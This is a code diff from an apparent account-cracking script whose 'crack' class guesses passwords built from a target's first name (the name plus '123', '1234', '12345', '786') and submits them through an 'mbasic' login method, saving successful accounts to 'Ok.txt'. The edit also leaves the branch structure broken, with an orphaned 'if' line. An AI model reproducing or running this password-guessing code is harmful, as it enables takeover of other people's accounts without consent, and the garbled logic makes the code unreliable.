@@ -692,19 +692,17 @@ class crack:
 					sempak = name.split(' ')
 					nun = sempak[0]
 					if len(nun)>=6:
-					elif len(nun)<=1:
-						pwx = [nun, nun+'123', nun+'1234', nun+'12', nun+'786', name]
+						pwx = [nun, nun+'123', nun+'1234', nun+'12345', nun+'786', name]
 					elif len(nun)<=2:
-						pwx = [nun, nun+'123', nun+'1234', nun+'12', nun+'786', name]
+						pwx = [nun, nun+'123', nun+'1234', nun+'12345', nun+'786', name]
 					elif len(nun)<=5:
-						pwx = [nun, nun+'123', nun+'1234', nun+'12', nun+'786', name]
+						pwx = [nun, nun+'123', nun+'1234', nun+'12345', nun+'786', name]
 					else:
-						pwx = [nun, nun+'123', nun+'1234', nun+'12', nun+'786', name]
+						pwx = [nun, nun+'123', nun+'1234', nun+'12345', nun+'786', name]
 					dihi.submit(self.mbasic, uid, pwx)
 				except Exception as e:os.sys.exit(e)
 				except:pass
 		exit()
-
 	def mobilez(self):
 		print(' %s '%(N))
 		print(' %s [%s*%s] OK account will be saved in the file : Ok.txt'%(N,O,N))
